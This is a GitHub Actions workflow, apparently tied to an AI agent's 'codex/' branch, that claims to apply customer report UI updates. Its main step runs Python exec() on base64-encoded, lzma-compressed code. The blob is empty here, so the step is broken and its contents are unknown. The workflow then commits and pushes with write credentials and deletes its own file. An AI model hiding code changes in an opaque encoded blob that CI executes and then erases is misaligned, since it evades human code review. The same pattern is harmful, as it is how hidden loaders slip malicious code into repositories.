name: Recora customer UI structure one-time

on:
  pull_request:
    branches: [master]
    types: [synchronize, ready_for_review]

permissions:
  contents: write

concurrency:
  group: recora-customer-ui-structure-one-time
  cancel-in-progress: false

jobs:
  apply:
    if: >-
      github.event.pull_request.head.repo.full_name == github.repository &&
      github.event.pull_request.head.ref == 'codex/customer-report-current' &&
      github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: codex/customer-report-current
          fetch-depth: 0
          persist-credentials: true

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm

      - name: Apply customer information architecture updates
        shell: bash
        run: python -c "import base64,lzma;exec(lzma.decompress(base64.b64decode('')).decode('utf-8'))"

      - name: Validate
        run: |
          npm ci
          npm run typecheck
          npm run lint
          npm run recora:dashboard-read-model:check
          git diff --check

      - name: Commit implementation and remove one-time workflow
        shell: bash
        run: |
          rm -f .github/workflows/recora-customer-ui-structure-once.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add \
            lib/recora/nav-config.ts \
            components/recora/customer-analysis/related-analysis.tsx \
            components/recora/customer-analysis/overview.tsx \
            components/recora/customer-analysis/brand.tsx \
            components/recora/customer-dashboard-v03-analysis.ts \
            components/recora/customer-dashboard-v03.tsx \
            .github/workflows/recora-customer-ui-structure-once.yml
          git commit -m "Improve customer report information architecture"
          git push origin HEAD:codex/customer-report-current
